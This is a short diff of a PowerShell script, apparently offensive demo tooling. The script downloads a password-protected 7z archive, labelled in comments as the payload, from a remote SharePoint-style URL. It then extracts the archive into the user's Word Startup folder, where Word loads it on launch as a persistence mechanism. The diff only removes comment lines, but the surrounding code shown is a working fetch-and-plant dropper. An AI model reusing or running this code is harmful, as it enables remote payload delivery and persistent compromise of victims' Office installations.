@@ -16,7 +16,6 @@ foreach ($file in $LNK)
 	}
 	
 #Sharepoint URL - Substitute guestaccess.aspx with download.aspx
-#$ZipPath = Join-Path -Path $env:USERPROFILE -ChildPath "\AppData\Roaming\Microsoft\Word\Startup\Latest-Forms.7z"
 $LocalDir = Convert-Path .
 $RemoteArchive = $LocalDir + "\Latest-Forms.7z"
 $ExtractPath = Join-Path -Path $env:USERPROFILE -ChildPath "\AppData\Roaming\Microsoft\Word\Startup\"
@@ -27,7 +26,6 @@ $webClient.DownloadFile( $Url, $RemoteArchive )
 sleep 2
 
 #Unzip and decrypt Payload - File: Latest-Forms.zip Password `BlackHat2017-Password12345`
-#Alais
 set-alias 7z "C:\Program Files\7-Zip\7z.exe"
 7z e .\Latest-Forms.7z -pBlackHat2017-Password12345 -oC:\Users\$env:USERNAME\APPData\Roaming\Microsoft\Word\Startup\
 
